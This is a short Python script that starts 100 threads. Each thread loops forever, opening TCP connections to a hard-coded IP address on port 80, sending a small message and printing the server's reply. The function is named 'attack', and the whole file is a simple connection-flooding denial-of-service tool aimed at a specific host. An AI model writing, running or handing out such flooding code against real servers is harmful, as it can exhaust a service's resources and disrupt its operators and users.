import socket
import threading

target = '172.100.43.251'
port = 80


def attack():
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target, port))
        data = "Hello, World!".encode()
        client_socket.send(data)
        response = client_socket.recv(1024)
        print("Respons dari server:", response.decode())
        client_socket.close()


for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()